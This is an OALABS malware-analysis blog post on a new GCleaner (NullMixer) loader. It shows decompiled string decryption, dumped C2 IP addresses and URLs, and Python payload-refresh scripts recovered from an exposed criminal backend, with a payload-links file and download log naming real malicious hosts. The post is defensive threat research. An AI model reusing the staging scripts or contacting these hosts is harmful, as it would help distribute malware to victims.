@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>New Gcleaner | OALABS Research</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="New Gcleaner" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A look into the the gcleaner backend" />
+<meta property="og:description" content="A look into the the gcleaner backend" />
+<link rel="canonical" href="https://research.openanalysis.net/gcleaner/loader/debugging/encryption/opendir/2024/03/17/new-gcleaner.html" />
+<meta property="og:url" content="https://research.openanalysis.net/gcleaner/loader/debugging/encryption/opendir/2024/03/17/new-gcleaner.html" />
+<meta property="og:site_name" content="OALABS Research" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-17T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="New Gcleaner" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-17T00:00:00-05:00","datePublished":"2024-03-17T00:00:00-05:00","description":"A look into the the gcleaner backend","headline":"New Gcleaner","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/gcleaner/loader/debugging/encryption/opendir/2024/03/17/new-gcleaner.html"},"url":"https://research.openanalysis.net/gcleaner/loader/debugging/encryption/opendir/2024/03/17/new-gcleaner.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+
+<script>
+function wrap_img(fn) {
+    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
+        var elements = document.querySelectorAll(".post img");
+        Array.prototype.forEach.call(elements, function(el, i) {
+            if (el.getAttribute("title") && (el.className != "emoji")) {
+                const caption = document.createElement('figcaption');
+                var node = document.createTextNode(el.getAttribute("title"));
+                caption.appendChild(node);
+                const wrapper = document.createElement('figure');
+                wrapper.className = 'image';
+                el.parentNode.insertBefore(wrapper, el);
+                el.parentNode.removeChild(el);
+                wrapper.appendChild(el);
+                wrapper.appendChild(caption);
+            }
+        });
+    } else { document.addEventListener('DOMContentLoaded', fn); }
+}
+window.onload = wrap_img;
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    // add link icon to anchor tags
+    var elem = document.querySelectorAll(".anchor-link")
+    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
+    });
+</script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/categories/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">New Gcleaner</h1><p class="page-description">A look into the the gcleaner backend</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2024-03-17T00:00:00-05:00" itemprop="datePublished">
+        Mar 17, 2024
+      </time>
+       • <span class="read-time" title="Estimated read time">
+    
+    
+      14 min read
+    
+</span></p>
+
+    
+      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
+      
+        <a class="category-tags-link" href="/categories/#gcleaner">gcleaner</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#loader">loader</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#debugging">debugging</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#encryption">encryption</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#opendir">opendir</a>
+        
+      
+      </p>
+    
+
+    
+      
+        <div class="pb-5 d-flex flex-justify-left">
+            <div class="px-2">
+                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
+                </a>
+            </div>
+          <div class="px-2">
+
+    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2024-03-17-new-gcleaner.ipynb" role="button" target="_blank">
+<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
+    </a>
+</div>
+
+          
+          
+          
+        </div>
+      </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#Overview">Overview </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#Samples">Samples </a></li>
+<li class="toc-entry toc-h3"><a href="#References">References </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a></li>
+<li class="toc-entry toc-h2"><a href="#Gcleaner-Backend">Gcleaner Backend </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#cronUpdate.py">cronUpdate.py </a></li>
+<li class="toc-entry toc-h3"><a href="#cupdate.py">cupdate.py </a></li>
+<li class="toc-entry toc-h3"><a href="#_links.json">_links.json </a></li>
+<li class="toc-entry toc-h3"><a href="#_links.log">_links.log </a></li>
+</ul>
+</li>
+</ul><!--
+#################################################
+### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
+#################################################
+# file to edit: _notebooks/2024-03-17-new-gcleaner.ipynb
+-->
+
+<div class="container" id="notebook-container">
+        
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Overview">
+<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
+</h2>
+<p>This is a new version of GCleaner the infamous NullMixer loader. Previous versions of GCleaner have been much larger binaries with more obfuscation, this new version is simplified with only a few functions used for C2 communication.</p>
+<h3 id="Samples">
+<a class="anchor" href="#Samples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Samples<a class="anchor-link" href="#Samples"> </a>
+</h3>
+<ul>
+<li>Packed <code>1fda9e004442de3c7a7ace86aeb2f35b982b3680a7ff0052d7992d216c60ce7c</code>  <a href="https://www.unpac.me/results/d983bb0d-dea6-4159-9c16-48393bf1d4de">UnpacMe</a>
+</li>
+<li>Unpacked <code>110c64b4a03a6ed6c8ffd2baba0a5831fd8bd59ca6b23d6e885a8f34e13461fc</code> <a href="https://www.unpac.me/results/d983bb0d-dea6-4159-9c16-48393bf1d4de?hash=110c64b4a03a6ed6c8ffd2baba0a5831fd8bd59ca6b23d6e885a8f34e13461fc#/">UnpacMe</a>
+</li>
+</ul>
+<h3 id="References">
+<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
+</h3>
+<ul>
+<li><a href="https://n1ght-w0lf.github.io/malware%20analysis/gcleaner-loader/">Deep Analysis of GCleaner</a></li>
+</ul>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Analysis">
+<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
+</h2>
+<p>Though they are using string encryption the encryption is poorly implemented and the key strings are decrypted in the C runtime startup functions and assigned to std::string classes. The encryption is also a simple single-byte XOR but this is irrelevant for our decryption.</p>
+<div class="highlight"><pre><span></span><span class="n">v3</span> <span class="o">=</span> <span class="mh">0x1B18001C1A001B</span><span class="n">i64</span><span class="p">;</span>
+<span class="n">v4</span> <span class="o">=</span> <span class="mi">773529375</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">dword_42BBC4</span> <span class="o">&gt;</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_Init_thread_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dword_42BBC4</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">dword_42BBC4</span> <span class="o">==</span> <span class="mi">-1</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">qword_42BBC8</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+        <span class="n">dword_42BBD0</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+        <span class="n">atexit</span><span class="p">(</span><span class="n">sub_41CB90</span><span class="p">);</span>
+        <span class="n">_Init_thread_footer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dword_42BBC4</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">HIBYTE</span><span class="p">(</span><span class="n">dword_42BBD0</span><span class="p">)</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xC</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+        <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">qword_42BBC8</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^=</span> <span class="mh">0x2Eu</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">dword_42BC68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">Size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">dword_42BC7C</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span>
+<span class="n">assign_string</span><span class="p">((</span><span class="n">std_string</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_42BC68</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">qword_42BBC8</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">qword_42BBC8</span><span class="p">));</span>
+</pre></div>
+<p>By adding a logging breakpoint on the std::string allocation function we can simply dump all the strings before the main() of the malware is reached.</p>
+<p><img src="https://i.imgur.com/tfNrAEN.png" alt=""></p>
+
+<pre><code>&amp;"185.172.128.90"
+&amp;"5.42.65.115"
+&amp;"two"
+???
+???
+"OKD"
+&amp;"NOSUB"
+&amp;"&amp;s="
+&amp;"/cpa/ping.php?substr="
+&amp;"185.172.128.90/cpa/ping.php?substr=one&amp;s=two"
+&amp;"185.172.128.90/cpa/ping.php?substr=one&amp;s=two"</code></pre>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Gcleaner-Backend">
+<a class="anchor" href="#Gcleaner-Backend" aria-hidden="true"><span class="octicon octicon-link"></span></a>Gcleaner Backend<a class="anchor-link" href="#Gcleaner-Backend"> </a>
+</h2>
+<p>While exploring the C2s one of the hosts had an open directory which exposed a portion of the backend of the gcleaner malware distribution network.</p>
+<p><img src="https://i.imgur.com/0qjWRMN.png" alt=""></p>
+<p>In addition to the <code>.php</code> files used to implement the C2 the backend uses python scripts and a json file used to refesh the payloads that are being distributed. It is also clear that the payloads are geo targeted. In this configuration, one for the EU and one for the US. Some of the payloads are also empty .NET stubs named <code>Gcleanerapp</code> <a href="https://www.unpac.me/results/1e37679b-f3cc-4eb0-b268-a2bbb66b509e">UnpacMe</a>.</p>
+<h3 id="cronUpdate.py">
+<a class="anchor" href="#cronUpdate.py" aria-hidden="true"><span class="octicon octicon-link"></span></a><code>cronUpdate.py</code><a class="anchor-link" href="#cronUpdate.py"> </a>
+</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">"user-agent"</span><span class="p">:</span> <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"</span>
+<span class="p">}</span>
+
+<span class="n">links</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="k">try</span><span class="p">:</span>
+  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/var/www/html/addons/_links.json"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">links</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="k">except</span><span class="p">:</span>
+  <span class="k">pass</span>
+
+<span class="n">out</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">"</span><span class="si">%d</span><span class="s2">/%m/%Y, %H:%M:%S"</span><span class="p">)</span> <span class="o">+</span> <span class="s2">" update.py</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">links</span><span class="p">:</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"0"</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+      <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">],</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> download error =========================</span><span class="se">\n</span><span class="s2">"</span>
+      <span class="n">tr</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="se">\n</span><span class="si">{</span><span class="n">tr</span><span class="si">}</span><span class="s2"> </span><span class="se">\n</span><span class="s2">=========================</span><span class="se">\n</span><span class="s2">"</span>
+      <span class="k">continue</span>
+
+    <span class="n">ln</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ln</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">):</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt; 1024, continue</span><span class="se">\n</span><span class="s2">"</span>
+      <span class="k">continue</span>
+
+    <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> -&gt; downloaded </span><span class="si">{</span><span class="n">ln</span><span class="si">}</span><span class="s2"> bytes</span><span class="se">\n</span><span class="s2">"</span>
+
+    <span class="k">try</span><span class="p">:</span>
+      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">"/var/www/html/addons/</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">.file"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> file write error =========================</span><span class="se">\n</span><span class="s2">"</span>
+      <span class="n">tr</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="se">\n</span><span class="si">{</span><span class="n">tr</span><span class="si">}</span><span class="s2"> </span><span class="se">\n</span><span class="s2">=========================</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">"/var/www/html/addons/_links.log"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+  <span class="k">pass</span>
+</pre></div>
+<h3 id="cupdate.py">
+<a class="anchor" href="#cupdate.py" aria-hidden="true"><span class="octicon octicon-link"></span></a><code>cupdate.py</code><a class="anchor-link" href="#cupdate.py"> </a>
+</h3>
+<div class="highlight"><pre><span></span><span class="c1"># sudo mcedit /etc/systemd/system/files_updater.service</span>
+
+<span class="c1"># [Unit]</span>
+<span class="c1"># Description=My updater service</span>
+<span class="c1"># After=multi-user.target</span>
+<span class="c1"># [Service]</span>
+<span class="c1"># Type=simple</span>
+<span class="c1"># Restart=always</span>
+<span class="c1"># ExecStart=/usr/bin/python3 /var/www/html/update.py</span>
+<span class="c1"># [Install]</span>
+<span class="c1"># WantedBy=multi-user.target</span>
+
+<span class="c1"># sudo systemctl daemon-reload</span>
+<span class="c1"># sudo systemctl enable files_updater.service</span>
+<span class="c1"># sudo systemctl start files_updater.service</span>
+<span class="c1"># sudo systemctl status files_updater.service</span>
+<span class="c1"># sudo systemctl restart files_updater.service</span>
+
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">"user-agent"</span><span class="p">:</span> <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"</span>
+<span class="p">}</span>
+
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="n">links</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">try</span><span class="p">:</span>
+      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/var/www/html/addons/_links.json"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">links</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="k">except</span><span class="p">:</span>
+      <span class="k">pass</span>
+
+    <span class="n">out</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">"</span><span class="si">%d</span><span class="s2">/%m/%Y, %H:%M:%S"</span><span class="p">)</span> <span class="o">+</span> <span class="s2">" update.py</span><span class="se">\n</span><span class="s2">"</span>
+
+    <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">links</span><span class="p">:</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"0"</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+          <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">],</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+          <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> download error =========================</span><span class="se">\n</span><span class="s2">"</span>
+          <span class="n">tr</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
+          <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="se">\n</span><span class="si">{</span><span class="n">tr</span><span class="si">}</span><span class="s2"> </span><span class="se">\n</span><span class="s2">=========================</span><span class="se">\n</span><span class="s2">"</span>
+          <span class="k">continue</span>
+
+        <span class="n">ln</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">ln</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">):</span>
+          <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt; 1024, continue</span><span class="se">\n</span><span class="s2">"</span>
+          <span class="k">continue</span>
+
+        <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> -&gt; downloaded </span><span class="si">{</span><span class="n">ln</span><span class="si">}</span><span class="s2"> bytes</span><span class="se">\n</span><span class="s2">"</span>
+
+        <span class="k">try</span><span class="p">:</span>
+          <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">"/var/www/html/addons/</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">.file"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+          <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">links</span><span class="p">[</span><span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2"> file write error =========================</span><span class="se">\n</span><span class="s2">"</span>
+          <span class="n">tr</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
+          <span class="n">out</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">"</span><span class="se">\n</span><span class="si">{</span><span class="n">tr</span><span class="si">}</span><span class="s2"> </span><span class="se">\n</span><span class="s2">=========================</span><span class="se">\n</span><span class="s2">"</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">"/var/www/html/addons/_links.log"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+      <span class="k">pass</span>
+
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span> <span class="c1"># Ð¿Ð¾Ð»Ñ‡Ð°ÑÐ°</span>
+  <span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+</pre></div>
+<h3 id="_links.json">
+<a class="anchor" href="#_links.json" aria-hidden="true"><span class="octicon octicon-link"></span></a><code>_links.json</code><a class="anchor-link" href="#_links.json"> </a>
+</h3>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"MIXTWO"</span><span class="p">:</span><span class="s2">"https:\/\/arbiscan.eu\/apple.exe"</span><span class="p">,</span><span class="nt">"MIXTEST"</span><span class="p">:</span><span class="s2">"0"</span><span class="p">,</span><span class="nt">"two"</span><span class="p">:</span><span class="s2">"0"</span><span class="p">}</span>
+</pre></div>
+<h3 id="_links.log">
+<a class="anchor" href="#_links.log" aria-hidden="true"><span class="octicon octicon-link"></span></a><code>_links.log</code><a class="anchor-link" href="#_links.log"> </a>
+</h3>
+<pre><code>
+13/12/2023 12:06 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:06 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:09 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:09 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
+13/12/2023 12:09 up.php -&gt; MIXTWO -&gt; http://http://stoon.hitsturbo.com/order/tuc7.exe -&gt; downloaded &lt; 1024
